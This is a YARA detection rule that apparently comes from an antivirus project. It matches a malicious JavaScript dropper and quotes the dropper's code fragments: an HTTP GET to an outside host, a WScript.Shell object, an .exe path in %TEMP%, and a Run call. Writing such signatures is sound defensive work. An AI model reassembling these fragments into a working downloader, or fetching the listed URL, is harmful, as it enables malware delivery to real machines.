rule sig_20160401_401e0e467dc40433b5aa75bcc0e42874 {
  meta:
    description = "datamaliciousorder - file 20160401_401e0e467dc40433b5aa75bcc0e42874.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d9c8cb5697c20a7376e8496bdeb3372e891ef193f362457e5dd1ebeb3a7e7c15"

  strings:
    $s1  = "CwiSsz[TdjKy](\"G\" + \"ET\", \"http://langeparis.com.au/s0powa\", false);" fullword ascii
    $s2  = "function ZuDke(HuCe, OoJss){SuEvk = SuEvk * 1; return HuCe - OoJss;};" fullword ascii
    $s3  = "var VjcBg = function BvhIj() {return WScript[RrpZst](\"WScript\"+\".Shell\");}(), NmwFss = 11;" fullword ascii
    $s4  = "if (CwiSsz[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function SciKkc() {return VjcBg[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"dkoJSgJSfLapU.ex\" + \"e\";};" fullword ascii
    $s6  = "function LxGk(){return LrqCed + \"\";};" fullword ascii
    $s7  = "function DiHpy() {return ((PxLm == true) && (PxLm == EcgLel)) ? 1 : SuEvk;};" fullword ascii
    $s8  = "function BbcLy(LnaRgq){VjcBg[\"R\"+\"un\"](LnaRgq, SuEvk, SuEvk);};" fullword ascii
    $s9  = "var MpFq = false;" fullword ascii
    $s10 = "function XtzXpp(){return RrpZst;};" fullword ascii
    $s11 = "EcgLel = true; " fullword ascii
    $s12 = "function IyoJjm()" fullword ascii
    $s13 = "function AvSx(JsjVu) {var MkoBrj = (1, 2, 3, 4, 5, JsjVu); return MkoBrj;};" fullword ascii
    $s14 = "PxLm = true; " fullword ascii
    $s15 = "var NxXsn = new this[\"Date\"]();" fullword ascii
    $s16 = "var PxLm = false;" fullword ascii
    $s17 = "}while (PcZtk);" fullword ascii
    $s18 = "function NbjQw(){return 23;};" fullword ascii
    $s19 = "return ZuDke(HkNxv, ZqcSnb);" fullword ascii
    $s20 = "var EcgLel = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}